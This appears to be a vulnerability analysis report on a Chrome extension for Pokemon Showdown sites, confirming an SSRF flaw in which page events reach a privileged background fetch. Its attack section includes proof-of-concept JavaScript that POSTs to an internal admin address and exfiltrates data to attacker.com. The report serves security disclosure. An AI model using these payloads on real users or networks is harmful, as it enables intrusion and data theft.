# CoCo Analysis: dgbjcmccheghgeihjfcmkpfdkdkppolh

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (fetch_resource_sink and fetch_options_sink - same flow)

---

## Sink 1: document_eventListener_myCustomEvent → fetch_resource_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dgbjcmccheghgeihjfcmkpfdkdkppolh/opgen_generated_files/cs_0.js
Line 495  document.addEventListener("myCustomEvent", function(evt) {
Line 497      evt.detail,

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dgbjcmccheghgeihjfcmkpfdkdkppolh/opgen_generated_files/bg.js
Line 967      console.debug([arg.url, arg.init]);
```

**Code:**

```javascript
// Content script (cs_0.js) - lines 495-503
document.addEventListener("myCustomEvent", function(evt) {
    chrome.runtime.sendMessage(
        evt.detail,  // ← attacker-controlled from webpage
        e => {
            var evt = new CustomEvent("StorageResponse", {detail: e});
            document.dispatchEvent(evt);
        }
    );
}, false);

// Background script (bg.js) - lines 965-973
chrome.runtime.onMessage.addListener(
    function(arg, sender, onSuccess) {
        console.debug([arg.url, arg.init]);
        fetch(arg.url, arg.init)  // ← attacker controls both URL and fetch options
            .then(response => response.text())
            .then(responseText => onSuccess(responseText))  // ← response sent back to attacker
        return true;  // Will respond asynchronously.
    }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM custom event

**Attack:**

```javascript
// On any webpage matching content_scripts patterns:
// *://play.pokemonshowdown.com/* or *://*.psim.us/*

// SSRF to internal network
document.dispatchEvent(new CustomEvent("myCustomEvent", {
    detail: {
        url: "http://192.168.1.1/admin",  // Internal network target
        init: {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({admin: true})
        }
    }
}));

// Or exfiltrate data to attacker server
document.dispatchEvent(new CustomEvent("myCustomEvent", {
    detail: {
        url: "https://attacker.com/collect",
        init: {
            method: "POST",
            body: "stolen_data"
        }
    }
}));

// Listen for response
document.addEventListener("StorageResponse", function(evt) {
    console.log("Response from privileged fetch:", evt.detail);
    // Attacker receives response from internal network or cross-origin requests
});
```

**Impact:** Complete SSRF vulnerability. Attacker-controlled webpages (matching the extension's content_scripts patterns) can trigger privileged cross-origin requests to any destination (extension has "*://*/*" host_permissions), including internal networks, with full control over URL, method, headers, and body. The extension sends responses back to the attacker, enabling information disclosure from otherwise inaccessible resources.

---

## Sink 2: document_eventListener_myCustomEvent → fetch_options_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dgbjcmccheghgeihjfcmkpfdkdkppolh/opgen_generated_files/cs_0.js
Line 495  document.addEventListener("myCustomEvent", function(evt) {
Line 497      evt.detail,

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dgbjcmccheghgeihjfcmkpfdkdkppolh/opgen_generated_files/bg.js
Line 967      console.debug([arg.url, arg.init]);
Line 260      sink_function(options.url, "fetch_options_sink");
```

**Classification:** TRUE POSITIVE

**Reason:** Duplicate of Sink 1. Same SSRF vulnerability, CoCo just flagged both the URL parameter and the options parameter separately.
